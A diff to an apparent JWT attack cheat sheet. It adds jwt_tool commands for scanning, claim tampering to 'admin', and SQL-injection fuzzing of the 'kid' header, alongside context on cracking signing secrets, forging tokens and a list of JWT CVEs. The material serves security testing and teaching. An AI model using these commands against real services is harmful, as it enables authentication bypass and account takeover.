@@ -6,6 +6,8 @@
 
 - [Tools](#tools)
 - [JWT Format](#jwt-format)
+    - [Header](#header)
+    - [Payload](#payload)
 - [JWT Signature - None algorithm](#jwt-signature---none-algorithm)
 - [JWT Signature - RS256 to HS256](#jwt-signature---rs256-to-hs256)
 - [Breaking JWT's secret](#breaking-jwts-secret)
@@ -188,6 +190,7 @@ First, bruteforce the "secret" key used to compute the signature.
 
 ```powershell
 git clone https://github.com/ticarpi/jwt_tool
+python3 -m pip install termcolor cprint pycryptodomex requests
 python3 jwt_tool.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6InVzZXIiLCJpYXQiOjE1MTYyMzkwMjJ9.1rtMXfvHSjWuH6vXBCaLLJiBghzVrLJpAQ6Dl5qD4YI -d /tmp/wordlist -C
 
         \   \        \         \          \                    \
@@ -249,6 +252,13 @@ Your new forged token:
 [+] Standard: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNTE2MjM5MDIyfQ.xbUXlOQClkhXEreWmB3da/xtBsT0Kjw7truyhDwF5Ic
 ```
 
+* Recon: `python3 jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.aqNCvShlNT9jBFTPBpHDbt2gBB1MyHiisSDdp8SQvgw`
+* Scanning: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -M pb`
+* Exploitation: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
+* Fuzzing: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -I -hc kid -hv custom_sqli_vectors.txt`
+* Review: `python3 jwt_tool.py -t https://www.ticarpi.com/ -rc "jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6InRpY2FycGkifQ.bsSwqj2c2uI9n7-ajmi3ixVGhPUiY7jO9SUn9dm15Po;anothercookie=test" -X i -I -pc name -pv admin`
+
+
 ### JWT cracker
 
 ```bash
@@ -265,6 +275,14 @@ Secret is "Sn1f"
 /hashcat -m 16500 hash.txt -a 3 -w 3 ?a?a?a?a?a?a
 eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMj...Fh7HgQ:secret
 ```
+
+## CVE
+
+* CVE-2015-2951 - The alg=none signature-bypass vulnerability
+* CVE-2016-10555 - The RS/HS256 public key mismatch vulnerability
+* CVE-2018-0114 - Key injection vulnerability
+* CVE-2019-20933/CVE-2020-28637 - Blank password vulnerability
+* CVE-2020-28042 - Null signature vulnerability
 
 ## References
 
